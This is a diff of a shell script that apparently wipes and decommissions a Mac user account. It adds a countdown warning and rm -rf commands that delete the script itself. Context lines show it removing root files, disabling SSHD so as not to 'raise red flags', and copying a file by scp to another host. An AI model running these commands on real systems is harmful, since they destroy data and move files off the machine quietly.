@@ -17,7 +17,14 @@ else
     exit
 fi
 
-echo "Removing this script before we start (will continue running regardless)..."
+echo "[WARNING] Will begin running in 5 seconds! Your data will start disappearing!!"
+sleep 5s
+
+echo "Removing this script from boesene's account before we start (will continue running regardless)..."
+rm -rf /Users/boesene/Desktop/setdown*
+rm -rf /Users/boesene/setdown*
+
+echo "Removing this script from root..."
 rm -rf /var/root/set*
 
 echo "Turning of SSHD for all users, which is off by default and could raise some red flags if noticed..."
@@ -78,10 +85,6 @@ for directory in `ls /Users/boesene/Desktop`; do
 done
 chmod 777 /Users/boesene/Desktop/notbackedup.txt
 scp /Users/boesene/Desktop/notbackedup.txt serv:~/compdump/Desktop/notbackedup.txt
-
-echo "Removing this script from boesene's account just in case it's there..."
-rm -rf /Users/boesene/Desktop/setdown*
-rm -rf /Users/boesene/setdown*
 
 echo "Disabling terminal session restoration..."
 # I myself already have this set to false.
